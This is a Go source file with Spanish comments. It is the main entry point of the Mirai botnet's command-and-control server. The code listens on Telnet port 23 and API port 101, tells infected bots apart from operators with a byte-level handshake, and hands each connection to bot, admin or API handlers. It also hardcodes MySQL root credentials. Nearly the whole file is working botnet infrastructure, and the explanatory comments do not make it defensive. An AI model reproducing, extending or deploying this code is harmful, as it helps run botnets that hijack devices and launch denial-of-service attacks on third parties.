/**
 * @file main.go
 * @brief Punto de entrada principal del servidor CNC
 *
 * Este archivo contiene:
 * - Configuración de conexión a la base de datos
 * - Inicialización del servidor
 * - Manejo de conexiones entrantes
 * - Separación de conexiones de bots y administradores
 * - Funciones auxiliares de red
 */

package main

import (
	"errors" // Para creación de errores personalizados
	"fmt"    // Para logging y mensajes de error
	"net"    // Para manejo de conexiones TCP
	"time"   // Para timeouts y temporizadores
)

/**
 * Configuración de la base de datos MySQL
 */
const DatabaseAddr string = "127.0.0.1" // Dirección del servidor MySQL
const DatabaseUser string = "root"      // Usuario MySQL
const DatabasePass string = "password"  // Contraseña MySQL
const DatabaseTable string = "mirai"    // Nombre de la base de datos

/**
 * Variables globales principales del sistema
 */
var clientList *ClientList = NewClientList()                                                  // Lista de bots conectados
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable) // Conexión a MySQL

/**
 * Función principal del servidor CNC
 *
 * Inicia dos servicios en paralelo:
 * 1. Servicio Telnet (puerto 23):
 *    - Acepta conexiones de bots y administradores
 *    - Usa protocolo personalizado para identificación
 *
 * 2. Servicio API (puerto 101):
 *    - Acepta conexiones para control programático
 *    - Requiere autenticación por clave API
 */
func main() {
	// Iniciamos el servidor Telnet en puerto 23
	tel, err := net.Listen("tcp", "0.0.0.0:23")
	if err != nil {
		fmt.Println(err)
		return
	}

	// Iniciamos el servidor API en puerto 101
	api, err := net.Listen("tcp", "0.0.0.0:101")
	if err != nil {
		fmt.Println(err)
		return
	}

	// Iniciamos goroutine para manejar conexiones API
	go func() {
		for {
			conn, err := api.Accept()
			if err != nil {
				break
			}
			// Cada conexión se maneja en su propia goroutine
			go apiHandler(conn)
		}
	}()

	// Loop principal para manejar conexiones Telnet
	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		// Cada conexión se maneja en su propia goroutine
		go initialHandler(conn)
	}

	fmt.Println("Stopped accepting clients")
}

/**
 * initialHandler maneja la identificación inicial de conexiones Telnet
 *
 * Esta función implementa un protocolo simple para diferenciar entre
 * conexiones de bots y administradores:
 *
 * Protocolo de identificación de bot:
 * [00 00 00 XX] - XX = versión del bot
 * [LL] - Longitud del string source (opcional)
 * [SS...] - String source (si LL > 0)
 *
 * Cualquier otro patrón se considera conexión de admin.
 *
 * @param conn Conexión TCP entrante a identificar
 */
func initialHandler(conn net.Conn) {
	// Aseguramos que la conexión se cierre al terminar
	defer conn.Close()

	// Establecemos timeout de 10 segundos para la identificación
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Leemos los primeros bytes para identificación
	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return // Error de lectura o conexión cerrada
	}

	// Verificamos si es un bot (patrón [00 00 00 XX])
	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			// Bot con source - leemos longitud
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}

			var source string
			if string_len[0] > 0 {
				// Leemos el string source
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			// Creamos y manejamos el bot con source
			NewBot(conn, buf[3], source).Handle()
		} else {
			// Bot sin source
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		// No es un bot - manejamos como admin
		NewAdmin(conn).Handle()
	}
}

/**
 * apiHandler maneja las conexiones al servidor API
 *
 * Esta función crea un nuevo manejador API para la conexión
 * y asegura que esta se cierre al terminar.
 *
 * @param conn Conexión TCP entrante a la API
 */
func apiHandler(conn net.Conn) {
	// Aseguramos que la conexión se cierre al terminar
	defer conn.Close()

	// Creamos y ejecutamos el manejador API
	NewApi(conn).Handle()
}

/**
 * readXBytes lee exactamente len(buf) bytes de una conexión
 *
 * Esta función realiza lecturas parciales hasta completar
 * el tamaño del buffer o encontrar un error. Es útil cuando
 * necesitamos leer una cantidad exacta de bytes del protocolo.
 *
 * @param conn Conexión TCP de la que leer
 * @param buf  Buffer donde almacenar los bytes leídos
 * @return     Error si la lectura falla o la conexión se cierra
 */
func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0 // Total de bytes leídos

	// Leemos hasta llenar el buffer
	for tl < len(buf) {
		// Intentamos leer los bytes que faltan
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n // Actualizamos total leído
	}

	return nil
}

/**
 * netshift aplica un desplazamiento de red para comparar prefijos IP
 *
 * Esta función implementa la operación necesaria para comparar
 * prefijos de red con diferentes máscaras. Desplaza los bits
 * del prefijo según la máscara para normalizar la comparación.
 *
 * @param prefix  Prefijo IP como uint32
 * @param netmask Máscara de red (número de bits)
 * @return        Prefijo desplazado para comparación
 */
func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
